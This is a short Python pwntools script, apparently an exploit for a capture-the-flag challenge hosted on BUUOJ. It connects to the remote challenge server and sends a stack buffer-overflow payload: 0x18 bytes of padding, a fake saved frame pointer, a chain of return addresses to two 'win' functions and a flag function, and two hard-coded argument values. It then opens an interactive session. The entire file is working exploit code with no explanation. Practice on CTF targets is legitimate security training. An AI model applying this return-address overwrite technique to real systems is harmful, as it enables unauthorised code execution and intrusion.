from pwn import *

context.log_level='debug'

p=remote("node5.buuoj.cn",27458)

win1_addr=0x80485CB
win2_addr=0x80485D8
flag_addr=0x804862B

# 0BAAAAAAD 0DEADBAAD
arg1=b'\xAD\xAA\xAA\xBA'
arg2=b'\xAD\xBA\xAD\xDE'

payload=b'a'*(0x18)+p32(0)+p32(win1_addr)+p32(win2_addr)+p32(flag_addr)+arg1+arg2

p.sendline(payload)

p.interactive()


